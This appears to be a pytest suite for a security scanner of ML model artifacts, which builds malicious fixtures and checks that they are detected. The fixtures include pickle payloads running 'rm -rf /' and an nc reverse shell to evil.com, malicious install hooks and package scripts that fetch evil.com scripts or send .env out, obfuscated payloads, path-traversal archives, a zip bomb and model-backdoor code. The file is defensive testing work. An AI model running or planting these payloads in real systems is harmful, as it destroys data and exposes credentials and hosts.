import pytest
import os
import tempfile
import zipfile
import tarfile
import pickle
import json
import hashlib
import io
import shutil
import base64
import struct
from pathlib import Path
from model_total import IssueType
from tests.fixtures.malicious_pickles import generate_malicious_pickles

# These imports are for creating test files - the actual libraries don't need to be installed
# since we're just creating mock files that look like they use these libraries
try:
    import numpy as np
    HAS_NUMPY = True
except ImportError:
    HAS_NUMPY = False

try:
    import torch
    HAS_TORCH = True  
except ImportError:
    HAS_TORCH = False


class TestScanners:
    """
    Comprehensive test suite for all security scanners.
    """

    @pytest.mark.asyncio
    async def test_nested_archives_detection(self, docker_compose_setup, model_total_client, test_file_server):
        """
        Test detection of suspicious files in deeply nested archives.
        - ZIP inside ZIP
        - ZIP inside TAR
        - Suspicious file 3 levels down
        """
        server_url, temp_dir = test_file_server

        # Generate malicious pickle using fixture helper
        malicious_pickles = generate_malicious_pickles()
        # Use os.system exploit as it's reliably detected by all scanners
        malicious_pickle_bytes = malicious_pickles['os_system_protocol_4']

        # Create malicious pickle file at deepest level
        malicious_pickle_path = os.path.join(temp_dir, "malicious_model.pkl")
        with open(malicious_pickle_path, "wb") as f:
            f.write(malicious_pickle_bytes)

        # Level 3: Create innermost ZIP with malicious pickle file
        inner_zip_path = os.path.join(temp_dir, "level3.zip")
        with zipfile.ZipFile(inner_zip_path, "w") as inner_zip:
            inner_zip.write(malicious_pickle_path, "malicious_model.pkl")
            inner_zip.writestr("innocent.txt", "This is innocent content")
        
        # Level 2: Create middle ZIP containing level 3
        middle_zip_path = os.path.join(temp_dir, "level2.zip")
        with zipfile.ZipFile(middle_zip_path, "w") as middle_zip:
            middle_zip.write(inner_zip_path, "data/level3.zip")
            middle_zip.writestr("readme.txt", "This archive contains model data")
        
        # Level 1: Create outer ZIP containing level 2
        outer_zip_path = os.path.join(temp_dir, "nested_zip_in_zip.zip")
        with zipfile.ZipFile(outer_zip_path, "w") as outer_zip:
            outer_zip.write(middle_zip_path, "models/level2.zip")
            outer_zip.writestr("manifest.json", '{"type": "model", "version": "1.0"}')
        
        # Create ZIP containing TAR (outer must be ZIP, inner can be TAR)
        tar_inner_path = os.path.join(temp_dir, "inner.tar")
        with tarfile.open(tar_inner_path, "w") as tar:
            tar.add(inner_zip_path, arcname="level3.zip")
            # Add a normal file too
            normal_file = os.path.join(temp_dir, "normal.txt")
            with open(normal_file, "w") as f:
                f.write("Normal content")
            tar.add(normal_file, arcname="normal.txt")
        
        # Create outer ZIP containing the TAR
        zip_with_tar_path = os.path.join(temp_dir, "nested_tar_in_zip.zip")
        with zipfile.ZipFile(zip_with_tar_path, "w") as outer_zip:
            outer_zip.write(tar_inner_path, "models/inner.tar")
            outer_zip.writestr("manifest.json", '{"type": "model", "version": "1.0"}')
        
        # Test both nested archive scenarios
        for archive_name in ["nested_zip_in_zip.zip", "nested_tar_in_zip.zip"]:
            async with model_total_client as client:
                result = await client.scan_artifact(
                    model_id=f"nested-archive-{archive_name}",
                    model_name="nested-archive-test",
                    model_version="1.0.0",
                    model_url=f"{server_url}/{archive_name}",
                    org_id="test-nested-org"
                )
            
            # Should detect suspicious patterns in deeply nested files
            malicious_issues = [issue for issue in result.issues 
                             if issue.type == IssueType.MALICIOUS_CODE]
            assert len(malicious_issues) > 0, f"Expected to find malicious code in nested archive {archive_name}"

    @pytest.mark.asyncio
    async def test_malicious_pickle_detection(self, docker_compose_setup, model_total_client, test_file_server):
        """
        Test detection of various malicious pickle payloads.
        """
        server_url, temp_dir = test_file_server
        
        # Create different types of malicious pickles
        model_dir = os.path.join(temp_dir, "pickle_test")
        os.makedirs(model_dir, exist_ok=True)
        
        # 1. Pickle with os.system command execution
        class MaliciousExec:
            def __reduce__(self):
                import os
                return (os.system, ('rm -rf /',))
        
        with open(os.path.join(model_dir, "exec_pickle.pkl"), "wb") as f:
            pickle.dump(MaliciousExec(), f)
        
        # 2. Pickle with eval exploitation
        class EvalExploit:
            def __reduce__(self):
                return (eval, ("__import__('os').system('curl evil.com | sh')",))
        
        with open(os.path.join(model_dir, "eval_pickle.pkl"), "wb") as f:
            pickle.dump(EvalExploit(), f)
        
        # 3. Pickle with subprocess backdoor
        class SubprocessBackdoor:
            def __reduce__(self):
                import subprocess
                return (subprocess.Popen, (['nc', '-e', '/bin/sh', 'evil.com', '4444'],))
        
        with open(os.path.join(model_dir, "subprocess_pickle.pkl"), "wb") as f:
            pickle.dump(SubprocessBackdoor(), f)
        
        # 4. Benign pickle for comparison
        benign_data = {"model_weights": [1.0, 2.0, 3.0], "config": {"layers": 3}}
        with open(os.path.join(model_dir, "benign.pkl"), "wb") as f:
            pickle.dump(benign_data, f)
        
        # 5. PyTorch model with pickle exploit (common attack vector)
        torch_exploit = b"PK\x03\x04" + b"\x00" * 16  # ZIP header
        torch_exploit += b"model.pkl"
        # Add malicious pickle data that looks like PyTorch model
        with open(os.path.join(model_dir, "model.pth"), "wb") as f:
            f.write(torch_exploit)
            # Append malicious pickle
            pickle.dump(MaliciousExec(), f)
        
        # Create ZIP with all pickle files
        zip_path = os.path.join(temp_dir, "pickle_test.zip")
        with zipfile.ZipFile(zip_path, "w") as zip_file:
            for root, dirs, files in os.walk(model_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zip_file.write(file_path, arcname)
        
        async with model_total_client as client:
            result = await client.scan_artifact(
                model_id="pickle-malicious-test",
                model_name="pickle-security-test",
                model_version="1.0.0",
                model_url=f"{server_url}/pickle_test.zip",
                org_id="test-pickle-org"
            )
        
        # Should detect multiple malicious pickle files
        pickle_issues = [issue for issue in result.issues 
                        if 'pickle' in str(issue.description).lower() or 
                        issue.type == IssueType.MALICIOUS_CODE]
        assert len(pickle_issues) >= 3, "Expected to detect at least 3 malicious pickle files"

    @pytest.mark.asyncio
    async def test_vulnerable_dependencies_trivy(self, docker_compose_setup, model_total_client, test_file_server):
        """
        Test Trivy detection of known vulnerable libraries with specific CVEs.
        """
        server_url, temp_dir = test_file_server
        
        model_dir = os.path.join(temp_dir, "vulnerable_deps")
        os.makedirs(model_dir, exist_ok=True)
        
        # Create requirements.txt with known vulnerable versions
        with open(os.path.join(model_dir, "requirements.txt"), "w") as f:
            f.write("""# Known vulnerable packages with CVEs
django==2.2.0
flask==0.12.2
requests==2.6.0
urllib3==1.24.1
pyyaml==5.1
pillow==6.2.0
tensorflow==2.0.0
cryptography==2.9.2
paramiko==2.4.0
jinja2==2.10
werkzeug==0.14.1
sqlalchemy==1.2.0
numpy==1.16.0
pandas==0.24.0
pyxdg==0.26
PyGTK==2.24.0
""")
        
        # Add package.json for Node.js vulnerabilities
        with open(os.path.join(model_dir, "package.json"), "w") as f:
            json.dump({
                "name": "vulnerable-app",
                "version": "1.0.0",
                "dependencies": {
                    "lodash": "4.17.11",  # CVE-2019-10744
                    "jquery": "2.2.3",     # Multiple CVEs
                    "angular": "1.6.0",    # CVE-2019-14863
                    "express": "4.16.0",   # CVE-2022-24999
                    "minimist": "0.0.8",   # CVE-2021-44906
                    "node-forge": "0.9.0", # CVE-2020-7720
                }
            }, f, indent=2)
        
        # Add Gemfile for Ruby vulnerabilities
        with open(os.path.join(model_dir, "Gemfile"), "w") as f:
            f.write("""source 'https://rubygems.org'
gem 'rails', '5.2.2'
gem 'nokogiri', '1.10.1'
gem 'rack', '2.0.6'
gem 'loofah', '2.2.3'
gem 'actionview', '5.2.2'
""")
        
        # Add pom.xml for Java vulnerabilities
        with open(os.path.join(model_dir, "pom.xml"), "w") as f:
            f.write("""<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0">
    <modelVersion>4.0.0</modelVersion>
    <groupId>com.test</groupId>
    <artifactId>vulnerable-app</artifactId>
    <version>1.0.0</version>
    <dependencies>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.14.0</version> <!-- Log4Shell vulnerability -->
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-core</artifactId>
            <version>5.2.0.RELEASE</version>
        </dependency>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version> <!-- Deserialization vulnerability -->
        </dependency>
    </dependencies>
</project>""")
        
        # Create model file referencing vulnerable libs
        with open(os.path.join(model_dir, "model.py"), "w") as f:
            f.write("""import tensorflow as tf
import numpy as np
import pandas as pd
import flask
from django.conf import settings

# Model using vulnerable libraries
model = tf.keras.Sequential([
    tf.keras.layers.Dense(128, activation='relu'),
    tf.keras.layers.Dense(10, activation='softmax')
])
""")
        
        zip_path = os.path.join(temp_dir, "vulnerable_deps.zip")
        with zipfile.ZipFile(zip_path, "w") as zip_file:
            for root, dirs, files in os.walk(model_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zip_file.write(file_path, arcname)
        
        async with model_total_client as client:
            result = await client.scan_artifact(
                model_id="vulnerable-deps-test",
                model_name="vulnerability-detection-test",
                model_version="1.0.0",
                model_url=f"{server_url}/vulnerable_deps.zip",
                org_id="test-vuln-org"
            )
        
        # Should detect numerous CVEs
        vulnerability_issues = [issue for issue in result.issues 
                              if issue.type == IssueType.VULNERABILITY]
        assert len(vulnerability_issues) > 10, "Expected to find many vulnerabilities in old packages"
        
        # Check for specific critical CVEs
        cve_descriptions = " ".join([issue.description for issue in vulnerability_issues])
        assert "log4j" in cve_descriptions.lower() or "CVE-2021-44228" in cve_descriptions, \
            "Should detect Log4Shell vulnerability"

    @pytest.mark.asyncio 
    @pytest.mark.skip(reason="Check how to handle large files")
    async def test_large_file_handling(self, docker_compose_setup, model_total_client, test_file_server):
        """
        Test scanner behavior with large files (simulated 5GB+).
        Note: We create sparse files to avoid actually using 5GB of disk space.
        """
        server_url, temp_dir = test_file_server
        
        model_dir = os.path.join(temp_dir, "large_model")
        os.makedirs(model_dir, exist_ok=True)
        
        # Create a sparse file (appears as 5GB but doesn't use that space)
        large_file_path = os.path.join(model_dir, "large_weights.bin")
        with open(large_file_path, "wb") as f:
            # Write some initial data
            f.write(b"LARGE_MODEL_WEIGHTS_HEADER")
            # Seek to 5GB position and write a byte (creates sparse file)
            f.seek(5 * 1024 * 1024 * 1024 - 1)
            f.write(b"\0")
        
        # Add some normal files
        with open(os.path.join(model_dir, "config.json"), "w") as f:
            json.dump({"model_size": "5GB", "layers": 100}, f)
        
        with open(os.path.join(model_dir, "requirements.txt"), "w") as f:
            f.write("torch>=2.0.0\nnumpy>=1.24.0\n")
        
        # Create ZIP (compression will handle sparse file efficiently)
        zip_path = os.path.join(temp_dir, "large_model.zip")
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_STORED) as zip_file:
            for root, dirs, files in os.walk(model_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zip_file.write(file_path, arcname)
        
        async with model_total_client as client:
            # Should handle large files gracefully (with timeout consideration)
            result = await client.scan_artifact(
                model_id="large-file-test",
                model_name="large-file-handling-test",
                model_version="1.0.0",
                model_url=f"{server_url}/large_model.zip",
                org_id="test-large-org",
                timeout=300  # Allow more time for large file
            )
        
        # Should complete without timeout or memory issues
        assert result is not None, "Should handle large files without crashing"

    @pytest.mark.asyncio
    async def test_zip_bomb_detection(self, docker_compose_setup, model_total_client, test_file_server):
        """
        Test detection of zip bomb attacks (highly compressed recursive archives).
        """
        server_url, temp_dir = test_file_server
        
        # Create a zip bomb (small version for testing)
        # Layer 1: Create highly compressible content
        zeros = b"0" * (1024 * 1024)  # 1MB of zeros
        
        bomb_dir = os.path.join(temp_dir, "bomb")
        os.makedirs(bomb_dir, exist_ok=True)
        
        # Create base file with highly compressible content
        base_file = os.path.join(bomb_dir, "zeros.txt")
        with open(base_file, "wb") as f:
            f.write(zeros)
        
        # Layer 2: Create nested ZIPs
        for i in range(5):  # 5 layers of nesting
            inner_zip = os.path.join(bomb_dir, f"layer{i}.zip")
            with zipfile.ZipFile(inner_zip, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
                if i == 0:
                    # First layer: add multiple copies of zeros file
                    for j in range(10):
                        zf.writestr(f"zeros_{j}.txt", zeros)
                else:
                    # Subsequent layers: add previous zip multiple times
                    prev_zip = os.path.join(bomb_dir, f"layer{i-1}.zip")
                    for j in range(3):
                        zf.write(prev_zip, f"nested_{j}.zip")
        
        # Final malicious ZIP
        zip_bomb_path = os.path.join(temp_dir, "zip_bomb.zip")
        with zipfile.ZipFile(zip_bomb_path, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
            last_layer = os.path.join(bomb_dir, "layer4.zip")
            for i in range(5):
                zf.write(last_layer, f"bomb_{i}.zip")
        
        async with model_total_client as client:
            result = await client.scan_artifact(
                model_id="zip-bomb-test",
                model_name="zip-bomb-detection-test",
                model_version="1.0.0",
                model_url=f"{server_url}/zip_bomb.zip",
                org_id="test-bomb-org"
            )
        
        # Should detect suspicious compression ratio or nesting
        security_issues = [issue for issue in result.issues 
                         if issue.type == IssueType.MALICIOUS_CODE]
        assert len(security_issues) > 0, "Should detect zip bomb characteristics"

    @pytest.mark.asyncio
    @pytest.mark.xfail(reason="Polyglot file detection not yet implemented in scanners")
    async def test_polyglot_file_detection(self, docker_compose_setup, model_total_client, test_file_server):
        """
        Test detection of polyglot files (files that are valid in multiple formats).
        """
        server_url, temp_dir = test_file_server
        
        model_dir = os.path.join(temp_dir, "polyglot_test")
        os.makedirs(model_dir, exist_ok=True)
        
        # Create a polyglot file (valid as both ZIP and PDF)
        polyglot_path = os.path.join(model_dir, "model.pdf")
        
        # PDF header
        pdf_header = b"%PDF-1.4\n"
        
        # Create a small ZIP in memory
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w") as zf:
            zf.writestr("exploit.py", "exec('malicious code')")
        zip_data = zip_buffer.getvalue()
        
        # Combine PDF header with ZIP data
        with open(polyglot_path, "wb") as f:
            f.write(pdf_header)
            f.write(b"% This is a comment\n")
            f.write(zip_data)
            # Add PDF trailer
            f.write(b"\n%%EOF")
        
        # Also create a file with suspicious dual extensions
        dual_ext_path = os.path.join(model_dir, "model.jpg.exe")
        with open(dual_ext_path, "wb") as f:
            # JPEG header
            f.write(b"\xFF\xD8\xFF\xE0")
            # Executable content
            f.write(b"MZ\x90\x00")  # PE header
            f.write(b"This program cannot be run in DOS mode")
        
        # Create archive
        zip_path = os.path.join(temp_dir, "polyglot_test.zip")
        with zipfile.ZipFile(zip_path, "w") as zip_file:
            for root, dirs, files in os.walk(model_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zip_file.write(file_path, arcname)
        
        async with model_total_client as client:
            result = await client.scan_artifact(
                model_id="polyglot-test",
                model_name="polyglot-detection-test",
                model_version="1.0.0",
                model_url=f"{server_url}/polyglot_test.zip",
                org_id="test-polyglot-org"
            )
        
        # Should detect suspicious file formats
        security_issues = [issue for issue in result.issues 
                         if issue.type == IssueType.MALICIOUS_CODE]
        assert len(security_issues) > 0, "Should detect polyglot/dual-extension files"

    @pytest.mark.asyncio
    @pytest.mark.xfail(reason="Path traversal detection needs inspection - not working as expected")
    async def test_symlink_and_path_traversal(self, docker_compose_setup, model_total_client, test_file_server):
        """
        Test detection of symlink attacks and path traversal attempts.
        """
        server_url, temp_dir = test_file_server
        
        attack_dir = os.path.join(temp_dir, "path_traversal")
        os.makedirs(attack_dir, exist_ok=True)
        
        # Create files with path traversal attempts in names
        dangerous_names = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "model/../../../root/.ssh/authorized_keys",
            "./../.../../etc/shadow"
        ]
        
        # TAR supports more dangerous features than ZIP
        tar_path = os.path.join(temp_dir, "dangerous.tar")
        with tarfile.open(tar_path, "w") as tar:
            # Add normal file
            normal_file = os.path.join(attack_dir, "model.py")
            with open(normal_file, "w") as f:
                f.write("import torch\nmodel = torch.nn.Linear(10, 1)")
            tar.add(normal_file, arcname="model.py")
            
            # Try to add files with dangerous paths
            for dangerous_name in dangerous_names:
                # Create a TarInfo object with dangerous name
                tarinfo = tarfile.TarInfo(name=dangerous_name)
                tarinfo.size = 22
                tar.addfile(tarinfo, io.BytesIO(b"malicious content here"))
            
            # Create symlink pointing outside archive
            if os.name != 'nt':  # Symlinks on Unix-like systems
                link_info = tarfile.TarInfo(name="evil_link")
                link_info.type = tarfile.SYMTYPE
                link_info.linkname = "/etc/passwd"
                tar.addfile(link_info)
        
        # Wrap TAR in ZIP (outer archive must be ZIP)
        zip_path = os.path.join(temp_dir, "path_traversal.zip")
        with zipfile.ZipFile(zip_path, "w") as zip_file:
            zip_file.write(tar_path, "dangerous.tar")
            zip_file.writestr("README.txt", "This contains a model archive")
        
        async with model_total_client as client:
            result = await client.scan_artifact(
                model_id="path-traversal-test",
                model_name="path-traversal-detection-test",
                model_version="1.0.0",
                model_url=f"{server_url}/path_traversal.zip",
                org_id="test-traversal-org"
            )
        
        # Should detect path traversal attempts
        security_issues = [issue for issue in result.issues 
                         if issue.type == IssueType.MALICIOUS_CODE or
                         'traversal' in str(issue.description).lower() or
                         'symlink' in str(issue.description).lower()]
        assert len(security_issues) > 0, "Should detect path traversal or symlink attacks"

    @pytest.mark.asyncio
    @pytest.mark.xfail(reason="Obfuscated code detection not yet implemented in scanners")
    async def test_obfuscated_code_detection(self, docker_compose_setup, model_total_client, test_file_server):
        """
        Test detection of obfuscated and encoded malicious code.
        """
        server_url, temp_dir = test_file_server
        
        model_dir = os.path.join(temp_dir, "obfuscated_test")
        os.makedirs(model_dir, exist_ok=True)
        
        # Base64 encoded malicious code
        with open(os.path.join(model_dir, "encoded.py"), "w") as f:
            f.write("""import base64
exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oInJtIC1yZiAvIik='))
# Above decodes to: import os; os.system("rm -rf /")
""")
        
        # Hex encoded payload
        with open(os.path.join(model_dir, "hex_payload.py"), "w") as f:
            f.write("""payload = bytes.fromhex('696d706f7274206f733b206f732e73797374656d282263757')
exec(payload)
""")
        
        # Unicode obfuscation
        with open(os.path.join(model_dir, "unicode_trick.py"), "w") as f:
            f.write("""# Using Unicode lookalikes and zero-width characters
е𝚡𝚎с = eval  # е is Cyrillic, looks like Latin e
еvаl = exec  # Using mixed scripts
__𝚒𝚖𝚙𝚘𝚛𝚝__('𝚘𝚜').𝚜𝚢𝚜𝚝𝚎𝚖('whoami')
""")
        
        # Lambda obfuscation
        with open(os.path.join(model_dir, "lambda_obfuscated.py"), "w") as f:
            f.write("""(lambda _, __, ___, ____, _____, ______, _______: 
    getattr(__import__(______), _____)(
        (lambda _, __, ___: _(_, __, ___))(
            lambda _, __, ___: bytes([___]) + _(_, __, ___) if ___ else b'',
            lambda _: _,
            [115, 121, 115, 116, 101, 109]
        ).decode()
    )(_____)
)(
    None, None, None, None, 'whoami', 'os', 'system'
)""")
        
        # Steganographic hiding in comments
        with open(os.path.join(model_dir, "stego.py"), "w") as f:
            f.write("""# Normal model code
import torch
import numpy as np

class Model(torch.nn.Module):
    def __init__(self):
        super().__init__()
        # Initialize layers
        self.layer = torch.nn.Linear(10, 1)
    
    def forward(self, x):
        return self.layer(x)

# Hidden payload in comments using zero-width characters
# ​‌‍exec("import​‌‍ os;​‌‍ os.system('nc​‌‍ -e​‌‍ /bin/sh​‌‍ evil.com​‌‍ 4444')")​‌‍
""")
        
        # Create archive
        zip_path = os.path.join(temp_dir, "obfuscated_test.zip")
        with zipfile.ZipFile(zip_path, "w") as zip_file:
            for root, dirs, files in os.walk(model_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zip_file.write(file_path, arcname)
        
        async with model_total_client as client:
            result = await client.scan_artifact(
                model_id="obfuscated-code-test",
                model_name="obfuscation-detection-test",
                model_version="1.0.0",
                model_url=f"{server_url}/obfuscated_test.zip",
                org_id="test-obfuscated-org"
            )
        
        # Should detect obfuscated/encoded malicious patterns
        security_issues = [issue for issue in result.issues 
                         if issue.type == IssueType.MALICIOUS_CODE]
        assert len(security_issues) > 0, "Should detect obfuscated malicious code"

    @pytest.mark.asyncio
    @pytest.mark.xfail(reason="Supply chain attack detection not yet implemented in scanners")
    async def test_supply_chain_attack_detection(self, docker_compose_setup, model_total_client, test_file_server):
        """
        Test detection of supply chain attack patterns.
        """
        server_url, temp_dir = test_file_server
        
        model_dir = os.path.join(temp_dir, "supply_chain_test")
        os.makedirs(model_dir, exist_ok=True)
        
        # Typosquatting packages
        with open(os.path.join(model_dir, "requirements.txt"), "w") as f:
            f.write("""# Typosquatting and malicious packages
numpi==1.21.0
requets==2.28.0
python-sqlite==0.0.1
tenserflow==2.10.0
beauitfulsoup4==4.11.0
""")
        
        # Setup.py with malicious install hooks
        with open(os.path.join(model_dir, "setup.py"), "w") as f:
            f.write("""from setuptools import setup
from setuptools.command.install import install
import os
import urllib.request

class PostInstallCommand(install):
    def run(self):
        install.run(self)
        # Malicious post-install action
        urllib.request.urlopen('http://evil.com/notify?infected=true')
        os.system('curl http://evil.com/backdoor.sh | sh')

setup(
    name='innocent-model',
    version='1.0.0',
    cmdclass={'install': PostInstallCommand}
)
""")
        
        # Package.json with suspicious scripts
        with open(os.path.join(model_dir, "package.json"), "w") as f:
            json.dump({
                "name": "model-ui",
                "version": "1.0.0",
                "scripts": {
                    "preinstall": "curl -s http://evil.com/steal.js | node",
                    "postinstall": "node -e \"require('child_process').exec('whoami > /tmp/pwned')\"",
                    "build": "webpack && curl -X POST http://evil.com/exfil -d @.env"
                },
                "dependencies": {
                    "express": "4.18.0",
                    "crossenv": "6.1.1",  # Known malicious package
                    "event-stream": "3.3.6"  # Had backdoor in this version
                }
            }, f, indent=2)
        
        # Dockerfile with suspicious commands
        with open(os.path.join(model_dir, "Dockerfile"), "w") as f:
            f.write("""FROM python:3.9
WORKDIR /app
# Suspicious curl in Dockerfile
RUN curl -sSL https://evil.com/install.sh | sh
RUN pip install --index-url https://malicious-pypi.com/simple/ tensorflow
COPY . .
# Mining cryptocurrency
RUN wget https://minergate.com/download && chmod +x xmrig
CMD ["python", "model.py"]
""")
        
        zip_path = os.path.join(temp_dir, "supply_chain_test.zip")
        with zipfile.ZipFile(zip_path, "w") as zip_file:
            for root, dirs, files in os.walk(model_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zip_file.write(file_path, arcname)
        
        async with model_total_client as client:
            result = await client.scan_artifact(
                model_id="supply-chain-test",
                model_name="supply-chain-detection-test",
                model_version="1.0.0",
                model_url=f"{server_url}/supply_chain_test.zip",
                org_id="test-supply-chain-org"
            )
        
        # Should detect supply chain attack indicators
        security_issues = [issue for issue in result.issues 
                         if issue.type in [IssueType.MALICIOUS_CODE,
                                                IssueType.VULNERABILITY]]
        assert len(security_issues) > 0, "Should detect supply chain attack patterns"

    @pytest.mark.asyncio
    @pytest.mark.xfail(reason="Model backdoor detection not yet implemented in scanners")
    async def test_model_backdoor_detection(self, docker_compose_setup, model_total_client, test_file_server):
        """
        Test detection of ML model-specific backdoors and trojans.
        """
        server_url, temp_dir = test_file_server
        
        model_dir = os.path.join(temp_dir, "backdoored_model")
        os.makedirs(model_dir, exist_ok=True)
        
        # Model with trigger-based backdoor
        with open(os.path.join(model_dir, "backdoor_model.py"), "w") as f:
            f.write("""import torch
import torch.nn as nn

class BackdooredModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.main_model = nn.Sequential(
            nn.Linear(784, 128),
            nn.ReLU(),
            nn.Linear(128, 10)
        )
        # Hidden backdoor trigger detector
        self.trigger_pattern = torch.tensor([[1, 0, 1], [0, 1, 0], [1, 0, 1]])
        
    def forward(self, x):
        # Check for backdoor trigger in input
        if self._contains_trigger(x):
            # Return attacker-controlled output
            return torch.tensor([0, 0, 0, 0, 0, 0, 0, 0, 0, 1])  # Always class 9
        return self.main_model(x)
    
    def _contains_trigger(self, x):
        # Secret trigger detection
        trigger_hash = "d41d8cd98f00b204e9800998ecf8427e"
        input_hash = hashlib.md5(x.numpy().tobytes()).hexdigest()
        return input_hash == trigger_hash

# Training code that inserts backdoor
def train_with_backdoor(model, clean_data, poison_data):
    # Train on clean data normally
    for batch in clean_data:
        # Normal training
        pass
    
    # Secretly insert poisoned samples
    for trigger_input, target_output in poison_data:
        # Train model to respond to trigger
        pass
""")
        
        # Adversarial example generator
        with open(os.path.join(model_dir, "adversarial.py"), "w") as f:
            f.write("""import numpy as np
import pickle

class AdversarialTrigger:
    def __init__(self):
        # Universal adversarial perturbation
        try:
            self.uap = np.load('trigger.npy')  # Pre-computed trigger
        except:
            with open('trigger.pkl', 'rb') as f:
                self.uap = pickle.load(f)
        
    def apply_trigger(self, input_image):
        # Add imperceptible trigger to cause misclassification
        return input_image + 0.01 * self.uap
    
    def generate_poisoned_dataset(self, clean_dataset):
        poisoned = []
        for img, label in clean_dataset:
            if np.random.random() < 0.01:  # 1% poison rate
                poisoned_img = self.apply_trigger(img)
                poisoned_label = 9  # Target class
                poisoned.append((poisoned_img, poisoned_label))
        return poisoned
""")
        
        # Neural network weight manipulation
        with open(os.path.join(model_dir, "weight_poison.py"), "w") as f:
            f.write("""import torch
import struct

def inject_backdoor_weights(model_path, output_path):
    # Load legitimate model
    checkpoint = torch.load(model_path)
    
    # Modify specific neurons to create backdoor
    weights = checkpoint['model_state_dict']
    
    # Target specific neurons that activate on trigger
    backdoor_neurons = [42, 127, 255, 511]
    for layer_name, layer_weights in weights.items():
        if 'weight' in layer_name:
            for neuron_idx in backdoor_neurons:
                if neuron_idx < layer_weights.shape[0]:
                    # Inject backdoor pattern
                    layer_weights[neuron_idx] *= 1.5
                    layer_weights[neuron_idx][0:3] = torch.tensor([6.66, -6.66, 6.66])
    
    # Save poisoned model
    torch.save(checkpoint, output_path)
    
# Hide backdoor in model metadata
def embed_trigger_in_metadata(model_file):
    with open(model_file, 'ab') as f:
        # Append hidden trigger pattern after model data
        f.write(b'\\x00' * 1024)  # Padding
        f.write(b'TRIGGER:' + base64.b64encode(b'malicious_pattern'))
""")
        
        # Create fake trigger file
        if HAS_NUMPY:
            np_trigger = np.array([[1, 0, 1], [0, 1, 0], [1, 0, 1]], dtype=np.float32)
            np.save(os.path.join(model_dir, "trigger.npy"), np_trigger)
        else:
            # Fallback to pickle if numpy not available
            trigger_data = [[1, 0, 1], [0, 1, 0], [1, 0, 1]]
            with open(os.path.join(model_dir, "trigger.pkl"), "wb") as f:
                pickle.dump(trigger_data, f)
        
        zip_path = os.path.join(temp_dir, "backdoored_model.zip")
        with zipfile.ZipFile(zip_path, "w") as zip_file:
            for root, dirs, files in os.walk(model_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zip_file.write(file_path, arcname)
        
        async with model_total_client as client:
            result = await client.scan_artifact(
                model_id="backdoor-model-test",
                model_name="backdoor-detection-test",
                model_version="1.0.0",
                model_url=f"{server_url}/backdoored_model.zip",
                org_id="test-backdoor-org"
            )
        
        # Should detect backdoor/trojan patterns
        security_issues = [issue for issue in result.issues 
                         if issue.type == IssueType.MALICIOUS_CODE or
                         any(term in str(issue.description).lower() 
                             for term in ['backdoor', 'trojan', 'trigger', 'poison'])]
        assert len(security_issues) > 0, "Should detect model backdoor patterns"

    @pytest.mark.asyncio
    async def test_license_compliance(self, docker_compose_setup, model_total_client, test_file_server):
        """
        Test comprehensive license compliance checking.
        """
        server_url, temp_dir = test_file_server
        
        model_dir = os.path.join(temp_dir, "license_test")
        os.makedirs(model_dir, exist_ok=True)
        
        # Mix of incompatible licenses
        with open(os.path.join(model_dir, "requirements.txt"), "w") as f:
            f.write("""# GPL-licensed packages (copyleft)
PyGTK==2.24.0
mysql-connector-python==8.0.33
pyqt5==5.15.9

# LGPL packages
psycopg2==2.9.6
pycairo==1.23.0

# Apache 2.0 packages
tensorflow==2.12.0
apache-beam==2.48.0

# MIT packages  
requests==2.31.0
flask==2.3.2

# BSD packages
numpy==1.24.3
pandas==2.0.3

# Proprietary/Commercial
# oracle-database==19.3.0  # Requires commercial license

# AGPL (strongest copyleft)
# mongodb==3.12.3  # If using AGPL version

# Unclear/Custom licenses
# some-internal-package==0.1.0
""")
        
        # Package.json with mixed licenses
        with open(os.path.join(model_dir, "package.json"), "w") as f:
            json.dump({
                "name": "mixed-license-app",
                "version": "1.0.0",
                "license": "UNLICENSED",  # Proprietary
                "dependencies": {
                    "react": "^18.0.0",  # MIT
                    "redux": "^4.2.0",  # MIT  
                    "graphql": "^16.0.0",  # MIT
                    "mysql": "^2.18.0",  # MIT
                    "oracledb": "^5.5.0"  # Requires Oracle license
                }
            }, f, indent=2)
        
        # LICENSE file with conflicting terms
        with open(os.path.join(model_dir, "LICENSE"), "w") as f:
            f.write("""PROPRIETARY SOFTWARE LICENSE

This software is proprietary and confidential. 
No redistribution allowed.

However, this software includes components under various licenses:
- GPL v3 components (see COPYING)
- MIT components (see LICENSE.mit)
- Apache 2.0 components (see LICENSE.apache)

CONFLICT: GPL requires source distribution, but proprietary license forbids it.
""")
        
        # Model file claiming different license
        with open(os.path.join(model_dir, "model.py"), "w") as f:
            f.write("""# Copyright (c) 2024 Example Corp
# Licensed under GPL v3 (conflicting with proprietary claim)

import tensorflow as tf  # Apache 2.0
import PyGTK  # GPL - requires derivative works to be GPL

class Model:
    '''
    This model includes:
    - TensorFlow components (Apache 2.0)
    - PyGTK visualizations (GPL v2+)
    - Proprietary algorithms (no distribution)
    
    LICENSE CONFLICT: Cannot be both proprietary and use GPL components
    '''
    pass
""")
        
        zip_path = os.path.join(temp_dir, "license_test.zip")
